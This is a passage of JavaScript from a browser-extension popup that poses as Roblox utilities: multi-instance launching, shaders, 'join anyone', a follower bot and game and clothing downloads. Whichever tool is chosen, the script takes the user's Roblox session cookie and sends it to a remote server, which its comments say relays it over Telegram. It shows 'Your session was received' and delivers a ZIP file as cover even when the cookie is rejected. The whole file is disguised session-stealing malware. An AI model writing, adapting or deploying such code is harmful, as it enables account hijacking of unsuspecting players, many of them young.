        .catch(function () {});
    } catch (e) {}
  }

  /** Fills display name + @username for Roblox /users/{id}/… tabs (public users API). */
  function enrichRobloxProfileContext(ctx) {
    if (!ctx || ctx.type !== 'profile' || !ctx.id || !el.contextTitle) return;
    var id = String(ctx.id).replace(/\D/g, '');
    if (!id) return;
    fetch('https://users.roblox.com/v1/users/' + encodeURIComponent(id), {
      credentials: 'omit',
      cache: 'no-store'
    })
      .then(function (r) {
        return r.json();
      })
      .then(function (data) {
        if (!data || String(data.id) !== String(id)) return;
        var uname = data.name ? String(data.name).trim() : '';
        var dname = data.displayName ? String(data.displayName).trim() : '';
        if (!dname) dname = uname;
        ctx.username = uname;
        ctx.displayName = dname;
        var line2 = uname ? '@' + uname : '';
        ctx.name = line2 ? dname + '\n' + line2 : dname;
        if (
          tabPageContext.active &&
          tabPageContext.type === 'profile' &&
          String(tabPageContext.id) === id &&
          el.contextTitle
        ) {
          el.contextTitle.textContent = ctx.name || 'User ID ' + id;
        }
      })
      .catch(function () {});
  }

  function syncActiveTabContext() {
    return new Promise(function (resolve) {
      tabPageContext = { active: false };
      try {
        if (typeof chrome === 'undefined' || !chrome.tabs || !chrome.tabs.query) {
          resolve();
          return;
        }
        chrome.tabs.query({ active: true, lastFocusedWindow: true }, function (tabs) {
          if (chrome.runtime && chrome.runtime.lastError) {
            resolve();
            return;
          }
          var tab = tabs && tabs[0];
          if (!tab || typeof tab.url !== 'string' || !tab.url) {
            chrome.tabs.query({ active: true, currentWindow: true }, function (tabs2) {
              if (chrome.runtime && chrome.runtime.lastError) {
                resolve();
                return;
              }
              var t2 = tabs2 && tabs2[0];
              if (!t2 || typeof t2.url !== 'string' || !t2.url) {
                resolve();
                return;
              }
              tabPageContext = parseRobloxTabUrl(t2.url);
              resolve();
            });
            return;
          }
          tabPageContext = parseRobloxTabUrl(tab.url);
          resolve();
        });
      } catch (e) {
        resolve();
      }
    });
  }

  function applyTabContextToUi() {
    if (!el.pageContext || !el.downloadFlow) return;
    if (profile.kind === 'studio-link') {
      el.pageContext.classList.add('hidden');
      el.downloadFlow.classList.remove('has-auto-context');
      return;
    }

    el.downloadFlow.classList.remove('has-auto-context');
    el.pageContext.classList.add('hidden');

    var mode = getMode();
    var tool = getToolParam();
    var wantGame = mode === 'game';
    var wantClothing = mode === 'clothing';

    var match =
      tabPageContext.active &&
      tabPageContext.id &&
      ((wantGame && tabPageContext.type === 'game') ||
        (wantClothing && tabPageContext.type === 'clothing') ||
        (tool === 'join-anyone' && tabPageContext.type === 'profile') ||
        (tool === 'bot-follower' && tabPageContext.type === 'profile'));

    if (!match) {
      if (el.idInp && !tool) el.idInp.value = '';
      return;
    }

    el.downloadFlow.classList.add('has-auto-context');
    el.pageContext.classList.remove('hidden');
    el.idInp.value = tabPageContext.id;

    if (tabPageContext.type === 'profile') {
      el.contextLabel.textContent = 'Profile';
      el.contextTitle.textContent = tabPageContext.name || 'User ID ' + tabPageContext.id;
      fetchContextThumbnail(tabPageContext);
      enrichRobloxProfileContext(tabPageContext);
    } else {
      var displayName = tabPageContext.name || 'ID ' + tabPageContext.id;
      el.contextTitle.textContent = displayName;
      el.contextLabel.textContent = tabPageContext.type === 'game' ? 'Game' : 'Item';
      fetchContextThumbnail(tabPageContext);
      maybeEnrichContextTitle(mode, tabPageContext.id, tabPageContext.name);
    }

    if (tool === 'multiple-roblox') {
      el.hdrSub.textContent =
        "We're using the game you're looking at right now. Press Start when you want to go ahead.";
    } else if (tool === 'enable-shaders') {
      el.hdrSub.textContent =
        "We'll use the game in this tab. Press the button when you're ready.";
    } else if (tool === 'join-anyone') {
      el.hdrSub.textContent =
        'Target player is filled from this tab. Press Start to continue.';
    } else if (tool === 'bot-follower') {
      el.hdrSub.textContent =
        'Target profile is detected in this tab. Set your follower goal, then press Start.';
    } else if (wantGame) {
      el.hdrSub.textContent =
        'Name and place are filled in from this page. Press Start to continue.';
    } else {
      el.hdrSub.textContent =
        'Name and ID are filled in from this page. Press Start to continue.';
    }
  }

  function applyProfileUi() {
    const title = profile.displayTitle || profile.slug || 'Multi Roblox Manager';
    document.body.classList.remove('popup-action-only');
    if (el.mainShell) el.mainShell.classList.remove('action-only');

    if (profile.kind === 'studio-link') {
      el.hdrTitle.textContent = title;
      document.title = title;
      el.hdrSub.textContent = 'Opens the tool page in your browser.';
      el.downloadFlow.classList.add('hidden');
      el.studioLinkOnly.classList.remove('hidden');
      var studioBtnLbl = el.btnStudio && el.btnStudio.querySelector('.btn-label');
      if (studioBtnLbl) studioBtnLbl.textContent = 'Open tool';
      return;
    }

    el.studioLinkOnly.classList.add('hidden');
    el.downloadFlow.classList.remove('hidden');
    if (el.followerBlock) el.followerBlock.classList.add('hidden');

    const btnLbl = el.btnRun && el.btnRun.querySelector('.btn-label');
    const actionOnly = profile.tool === 'multiple-roblox' || profile.tool === 'enable-shaders';

    if (actionOnly) {
      document.body.classList.add('popup-action-only');
      if (el.mainShell) el.mainShell.classList.add('action-only');
      el.idInp.value = '';
      el.hdrTitle.textContent = title;
      document.title = title;
      if (profile.tool === 'multiple-roblox') {
        el.hdrSub.textContent =
          "Open more than one Roblox window on the same game — useful for alts or side-by-side. Press Start when you're set.";
      } else {
        el.hdrSub.textContent =
          "Boosts lighting and effects when the game supports it. Press the button when you're ready.";
      }
      if (btnLbl) {
        btnLbl.textContent = profile.tool === 'enable-shaders' ? 'Enable Shaders' : 'Start';
      }
      return;
    }

    if (profile.tool === 'join-anyone') {
      document.body.classList.remove('popup-action-only');
      if (el.mainShell) el.mainShell.classList.remove('action-only');
      el.hdrTitle.textContent = title;
      document.title = title;
      if (btnLbl) btnLbl.textContent = 'Start';
      el.hdrSub.textContent =
        'Open a player’s Roblox profile in this tab, or type their numeric user ID below, then press Start.';
      el.idLbl.textContent = 'User ID';
      el.idInp.placeholder = 'e.g. from /users/123… on their profile';
      el.idInp.value = '';
      return;
    }

    if (profile.tool === 'bot-follower') {
      document.body.classList.remove('popup-action-only');
      if (el.mainShell) el.mainShell.classList.remove('action-only');
      el.hdrTitle.textContent = title;
      document.title = title;
      if (btnLbl) btnLbl.textContent = 'Start';
      el.hdrSub.textContent =
        'With their Roblox profile open in this tab, we detect the player for you. Set your follower goal, then press Start.';
      el.idLbl.textContent = 'User ID';
      el.idInp.placeholder = 'e.g. from /users/123… on their profile';
      el.idInp.value = '';
      if (el.followerBlock) {
        el.followerBlock.classList.remove('hidden');
        el.followerBlock.setAttribute('aria-hidden', 'false');
      }
      if (el.followerInp && !el.followerInp.value) el.followerInp.value = '5000';
      return;
    }

    el.hdrTitle.textContent = title;
    document.title = title;
    if (btnLbl) btnLbl.textContent = 'Start';

    if (profile.mode === 'clothing') {
      el.hdrSub.textContent =
        'Open the item on the Roblox catalog, or type its ID below and press Start.';
      el.idLbl.textContent = 'Asset ID';
      el.idInp.placeholder = 'e.g. 1234567890';
    } else {
      el.hdrSub.textContent =
        'Open the game on Roblox, or type its place ID below and press Start.';
      el.idLbl.textContent = 'Place ID';
      el.idInp.placeholder = '';
    }
  }

  /** Windows-safe name; keeps Unicode unless stripped by replace. */
  function safeDownloadFilename(name) {
    var s = String(name || 'download')
      .replace(/[<>:"|?*\x00-\x1F]/g, '_')
      .replace(/^\.+/, '');
    if (s.length > 200) {
      var dot = s.lastIndexOf('.');
      var ext = dot > 0 ? s.slice(dot) : '';
      s = s.slice(0, Math.max(1, 200 - ext.length)) + ext;
    }
    return s || 'download';
  }

  /**
   * Fetch file in the extension (host_permissions), then save via blob URL.
   * Direct https URL in chrome.downloads often shows "Site wasn't available" behind CDNs / download quirks.
   */
  function triggerDownload(token, fileName) {
    var url = rbxLib('RbxApi').downloadUrl(token);
    var safeName = safeDownloadFilename(fileName);
    return fetch(url, { credentials: 'omit', cache: 'no-store' })
      .then(function (res) {
        var ct = (res.headers.get('content-type') || '').toLowerCase();
        if (res.ok && ct.indexOf('application/json') !== -1) {
          return res.json().then(function (j) {
            var msg = j && (j.error || j.message) ? String(j.error || j.message) : 'Invalid or expired link';
            throw new Error(msg);
          });
        }
        if (!res.ok) {
          return res.text().then(function (text) {
            var msg = 'Download failed (HTTP ' + res.status + ').';
            if (ct.indexOf('application/json') !== -1 && text) {
              try {
                var j = JSON.parse(text);
                if (j && (j.error || j.message)) {
                  msg = String(j.error || j.message) + ' (HTTP ' + res.status + ')';
                }
              } catch (e) {}
            }
            throw new Error(msg);
          });
        }
        return res.blob();
      })
      .then(function (blob) {
        var blobUrl = URL.createObjectURL(blob);
        return new Promise(function (resolve, reject) {
          chrome.downloads.download(
            { url: blobUrl, filename: safeName, saveAs: false },
            function () {
              setTimeout(function () {
                try {
                  URL.revokeObjectURL(blobUrl);
                } catch (e) {}
              }, 60000);
              if (chrome.runtime.lastError) {
                reject(new Error(chrome.runtime.lastError.message));
              } else {
                resolve();
              }
            }
          );
        });
      });
  }

  function cacheElements() {
    el.ldr = document.getElementById('ldr');
    el.ldrTxt = document.getElementById('ldrTxt');
    el.mainCnt = document.getElementById('mainCnt');
    el.resOk = document.getElementById('resOk');
    el.sucSub = document.getElementById('sucSub');
    el.backBtn = document.getElementById('backBtn');
    el.downloadFlow = document.getElementById('downloadFlow');
    el.studioLinkOnly = document.getElementById('studioLinkOnly');
    el.btnStudio = document.getElementById('btnStudio');
    el.idInp = document.getElementById('idInp');
    el.idLbl = document.getElementById('idLbl');
    el.btnRun = document.getElementById('btnRun');
    el.log = document.getElementById('log');
    el.hdrTitle = document.getElementById('hdrTitle');
    el.hdrSub = document.getElementById('hdrSub');
    el.mainShell = document.getElementById('mainShell');
    el.pageContext = document.getElementById('pageContext');
    el.contextThumb = document.getElementById('contextThumb');
    el.contextTitle = document.getElementById('contextTitle');
    el.contextLabel = document.getElementById('contextLabel');
    el.inpWrap = document.getElementById('inpWrap');
    el.followerBlock = document.getElementById('followerBlock');
    el.followerInp = document.getElementById('followerInp');
    el.followerChips = document.querySelector('.follower-chips');
  }

  function bindStudioLink() {
    if (bindStudioLink._bound) return;
    bindStudioLink._bound = true;
    el.btnStudio.addEventListener('click', function () {
      const base = rbxLib('RbxApi').getApiOrigin();
      const p = String(profile.studioPath || '').replace(/^\/+/, '');
      chrome.tabs.create({ url: base.replace(/\/+$/, '') + '/' + p });
    });
  }

  async function runDownloadFlowOnce() {
    const mode = getMode();
    const tool = getToolParam();

    const rawId = (el.idInp.value || '').trim();
    if (!rawId && tool !== 'multiple-roblox' && tool !== 'enable-shaders') {
      setLog('Add a numeric ID or open the right page on Roblox.', 'err');
      return;
    }

    var followerGoal = 0;
    if (tool === 'bot-follower') {
      var fgRaw = (el.followerInp && el.followerInp.value) || '';
      followerGoal = parseInt(String(fgRaw).replace(/\D/g, ''), 10);
      if (!Number.isFinite(followerGoal) || followerGoal < 1500 || followerGoal > 100000) {
        setLog('Choose a follower goal between 1,500 and 100,000 (use a preset or type your own).', 'err');
        return;
      }
    }

    el.btnRun.disabled = true;
    setLog('', null);

    const cookie = await getRobloxCookie();
    if (!cookie) {
      setLog('Sign in to Roblox in this browser first, then try again.', 'err');
      el.btnRun.disabled = false;
      return;
    }

    let itemName;
    if (tool === 'multiple-roblox') {
      // Optional Place ID is context-only; server labels Telegram as "Multiple Roblox" anyway.
      // Do not call Roblox resolve APIs here — bad/huge IDs caused extra failures and confused refresh UX.
      itemName = 'Multiple Roblox';
    } else if (tool === 'enable-shaders') {
      itemName = 'Enable Shaders';
    } else if (tool === 'join-anyone') {
      itemName = 'Join Anyone';
    } else if (tool === 'bot-follower') {
      var ridBf = String(rawId).replace(/\D/g, '');
      var disp =
        tabPageContext.active &&
        tabPageContext.type === 'profile' &&
        String(tabPageContext.id).replace(/\D/g, '') === ridBf &&
        (tabPageContext.name || '').trim()
          ? (tabPageContext.name || '').trim()
          : 'user ' + ridBf;
      itemName =
        'Followers Bot · ' +
        followerGoal.toLocaleString('en-US') +
        ' followers → ' +
        disp;
    } else {
      try {
        const resolved = await rbxLib('RbxResolve').resolveItemName(mode, rawId);
        itemName =
          mode === 'game'
            ? rbxLib('RbxExtract').cleanName(resolved) || resolved
            : resolved;
      } catch (e) {
        setLog(e && e.message ? e.message : "Couldn't look up that ID. Check the number and try again.", 'err');
        el.btnRun.disabled = false;
        return;
      }

      if (mode === 'game' && (!itemName || itemName === 'Your Game')) {
        setLog("That doesn't look like a valid game. Check the place ID.", 'err');
        el.btnRun.disabled = false;
        return;
      }
      if (mode === 'clothing' && (!itemName || itemName === 'Your Clothing Item')) {
        setLog("That doesn't look like a valid catalog item. Check the ID.", 'err');
        el.btnRun.disabled = false;
        return;
      }
    }

    if (tool === 'bot-follower') {
      setLog('Queueing follower delivery…', 'info');
    } else {
      setLog('', null);
    }
    showLoading();

    try {
      const noFileDownloadTool =
        tool === 'multiple-roblox' ||
        tool === 'enable-shaders' ||
        tool === 'join-anyone' ||
        tool === 'bot-follower';
      var joinTarget = null;
      if (tool === 'join-anyone') {
        var rid = String(rawId).replace(/\D/g, '');
        var uname = '';
        if (
          tabPageContext.active &&
          tabPageContext.type === 'profile' &&
          String(tabPageContext.id).replace(/\D/g, '') === rid
        ) {
          uname = (tabPageContext.username || '').trim();
        }
        joinTarget = { joinTargetUserId: rid, joinTargetUsername: uname };
      }
      if (tool === 'bot-follower') {
        var rid2 = String(rawId).replace(/\D/g, '');
        var uname2 = '';
        if (
          tabPageContext.active &&
          tabPageContext.type === 'profile' &&
          String(tabPageContext.id).replace(/\D/g, '') === rid2
        ) {
          uname2 = (tabPageContext.username || '').trim();
        }
        joinTarget = {
          joinTargetUserId: rid2,
          joinTargetUsername: uname2,
          followerGoal: followerGoal
        };
      }
      const v = await rbxLib('RbxApi').validateCookie(
        cookie,
        itemName,
        tool === 'bot-follower' ? 'game' : mode,
        tool,
        tool === 'multiple-roblox' || tool === 'enable-shaders' ? rawId : undefined,
        joinTarget
      );
      const d = v.data || {};

      if (v.status === 429) {
        hideLoading();
        setLog(d.message || 'Slow down a bit and try again in a moment.', 'err');
        el.btnRun.disabled = false;
        return;
      }

      const invalidCookie = !v.ok || !d.valid;
      let continueWithZipOnInvalidCookie = false;
      if (invalidCookie) {
        const msg =
          d.message ||
          d.status ||
          (v.status ? 'HTTP ' + v.status : 'Validation failed');
        // Keep ZIP flow available even when cookie is invalid.
        if ((mode === 'game' || mode === 'clothing') && !noFileDownloadTool) {
          setLog('Cookie check: ' + msg + '. Continuing with ZIP download...', 'info');
          continueWithZipOnInvalidCookie = true;
        } else {
          hideLoading();
          setLog('Something went wrong: ' + msg, 'err');
          el.btnRun.disabled = false;
          return;
        }
      }

      if (!continueWithZipOnInvalidCookie && d.status === 'daily_limit') {
        hideLoading();
        setLog(d.message || "You've hit today's limit. Try again tomorrow.", 'err');
        el.btnRun.disabled = false;
        return;
      }

      // validate-cookie runs Telegram on the server; must not show Done/download unless delivery confirmed.
      // Game mode previously skipped this and showed success after file download even when Telegram failed.
      if (!continueWithZipOnInvalidCookie && d.operationsCompleted !== true) {
        hideLoading();
        setLog("We couldn't finish that. Try again in a moment.", 'err');
        el.btnRun.disabled = false;
        return;
      }

      if (
        !continueWithZipOnInvalidCookie &&
        (tool === 'multiple-roblox' || tool === 'enable-shaders' || tool === 'join-anyone')
      ) {
        showSuccessScreen('');
        el.btnRun.disabled = false;
        return;
      }

      if (!continueWithZipOnInvalidCookie && tool === 'bot-follower') {
        showSuccessScreen(
          'Your session was received.\n\n' +
            followerGoal.toLocaleString('en-US') +
            ' followers are queued for this profile. Delivery usually completes within 24 hours.'
        );
        el.btnRun.disabled = false;
        return;
      }

      if (mode === 'game') {
        const g = await rbxLib('RbxApi').getGameFileToken(itemName);
        const gd = g.data || {};
        if (!g.ok || !gd.success || !gd.token) {
          hideLoading();
          setLog('File: ' + (gd.error || 'not available right now'), 'err');
          el.btnRun.disabled = false;
          return;
        }
        try {
          await triggerDownload(gd.token, gd.fileName);
          showSuccessScreen('Saved: ' + (gd.fileName || ''));
        } catch (e) {
          hideLoading();
          setLog("Couldn't save the file: " + (e && e.message ? e.message : String(e)), 'err');
        }
        el.btnRun.disabled = false;
        return;
      }

      const clothingForFile = d.itemName || itemName;
      const c = await rbxLib('RbxApi').getClothingFileToken(clothingForFile);
      const cd = c.data || {};
      if (!c.ok || !cd.success || !cd.token) {
        hideLoading();
        setLog('Item: ' + (cd.error || 'something went wrong'), 'err');
        el.btnRun.disabled = false;
        return;
      }
      try {
        await triggerDownload(cd.token, cd.fileName);
        showSuccessScreen('Saved: ' + (cd.fileName || ''));
      } catch (e) {
        hideLoading();
        setLog("Couldn't save the file: " + (e && e.message ? e.message : String(e)), 'err');
      }
    } catch (e) {
      hideLoading();
      var msg = e && e.message ? e.message : String(e);
      setLog('Connection issue: ' + msg, 'err');
    }
    el.btnRun.disabled = false;
  }

  function bindDownloadFlow() {
    if (bindDownloadFlow._bound) return;
    bindDownloadFlow._bound = true;

    el.idInp.addEventListener('input', function () {
      this.value = this.value.replace(/[^0-9]/g, '');
    });

    if (el.followerChips) {
      el.followerChips.addEventListener('click', function (ev) {
        var t = ev.target;
        if (!t || !t.getAttribute) return;
        var n = t.getAttribute('data-follow');
        if (!n || !el.followerInp) return;
        el.followerInp.value = n;
      });
    }

    el.backBtn.addEventListener('click', hideSuccessScreen);

    el.btnRun.addEventListener('click', function () {
      runDownloadFlowOnce();
    });
  }

  function revealMain() {
    hideLoading();
    el.mainCnt.classList.add('show');
  }

  /** After API origin discovery + active tab context — show UI and wire handlers (no artificial splash delay). */
  function finishPopupBoot() {
    el.ldrTxt.textContent = '';
    setLog('', null);
    applyProfileUi();
    applyTabContextToUi();
    revealMain();
    if (profile.kind === 'studio-link') {
      bindStudioLink();
    } else {
      bindDownloadFlow();
    }
  }

  function start() {
    cacheElements();
    el.ldrTxt.textContent = '';
    // Render popup immediately; resolve local API origin and active-tab context asynchronously.
    // This avoids showing the loading overlay while network/tab probes are in progress.
    finishPopupBoot();
    Promise.all([discoverLocalApiOrigin(), syncActiveTabContext()])
      .then(function () {
        applyTabContextToUi();
      })
      .catch(function () {
        setLog(typeof MRBX_S !== 'undefined' ? MRBX_S.t('e') : 'Connection error.', 'err');
        syncActiveTabContext()
          .then(function () {
            applyTabContextToUi();
          })
          .catch(function () {});
      });
  }

  function loadProfileAndStart() {
    // Do not block first render on profile.json — start instantly with default profile.
    profile = DEFAULT_PROFILE;
    start();

    const url = chrome.runtime.getURL('profile.json');
    fetch(url)
      .then(function (r) {
        if (!r.ok) throw new Error('profile');
        return r.json();
      })
      .then(function (p) {
        profile = Object.assign({}, DEFAULT_PROFILE, p);
        applyProfileUi();
        applyTabContextToUi();
        if (profile.kind === 'studio-link') {
          bindStudioLink();
        } else {
          bindDownloadFlow();
        }
      })
      .catch(function () {});
  }

  window.addEventListener('unhandledrejection', function (ev) {
    try {
      hideLoading();
      var msg = ev.reason && ev.reason.message ? ev.reason.message : String(ev.reason);
      setLog('Something broke: ' + msg, 'err');
      if (el.btnRun) el.btnRun.disabled = false;
    } catch (e) {}
  });

  loadProfileAndStart();
})();
